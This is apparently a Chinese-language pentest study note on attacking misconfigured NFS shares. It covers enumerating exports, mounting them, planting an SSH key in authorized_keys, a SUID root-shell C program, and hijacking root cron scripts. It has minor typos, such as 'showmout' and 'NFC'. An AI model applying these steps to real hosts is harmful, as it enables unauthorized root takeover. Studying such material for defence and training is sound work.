# NFS(Network File System)

## 介绍

端口：2049/TCP

常见系统：Linux/Unix

用途：共享文件

价值：写文件、放SSH KEY、放SUID文件、直接Root

配置型高危服务

思考：

共享那些目录、谁能挂载（anyone/IP限制）、共享目录是不是可写

## 枚举共享目录

showmout -e ip

回应：

/home *

/backup *

*=任何人都能够挂载磁盘

## 挂载共享目录到本地

mkdir /tmp/nfs

sudo mount -t nfs targetIp:/home /tmp/nfs

现在：

/tmp/nfs = 远程/home

## 利用方式

### 方法1：写SSH公钥

/tmp/nfs/user/.ssh/

echo "我的SSH公钥“ > /tmp/nfs/user/.ssh/authorized_keys

ssh user@targetIp -i id_rsa

### 方法2:SUID提权

如果共享目录可写；并且.

1）NFS没开root_squash

2）或能够控制文件属主

放一个SUID程序

// suid.c
	#include <stdlib.h>
	int main(){
	  setuid(0);
 	 system("/bin/bash");
	}

编译

gcc suid.c -o suid

chmod +s suid

放到NFS共享里-在目标主机执行-获得Root

### 方法3：改脚本/配置

NFC共享里有：

1）备份脚本

2）cron调用脚本

3）我能够修改

4）cron以root执行我的脚本

## NFC的关键配置

root_squash vs no_root_squash

root_squash(安全)

​	远程root->映射为nfsnobody

no_root_squash(危险)

​	远程root->映射为本地root

no_root_squash=提权金矿

## NFC的最小通过标准

知道端口2049

会用showmount -e

会挂载共享目录

知道3种利用方向（SSH、SUID、Cron）